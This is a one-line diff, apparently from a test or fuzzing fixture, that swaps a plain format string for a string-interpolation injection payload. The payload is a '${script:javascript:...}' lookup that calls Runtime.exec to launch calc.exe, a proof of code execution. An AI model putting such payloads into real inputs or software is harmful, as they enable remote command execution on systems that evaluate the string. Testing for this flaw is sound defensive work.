@@ -1,1 +1,1 @@
-Format with {0} and {1} and {999}
+${script:javascript:java.lang.Runtime.getRuntime().exec('calc.exe')}
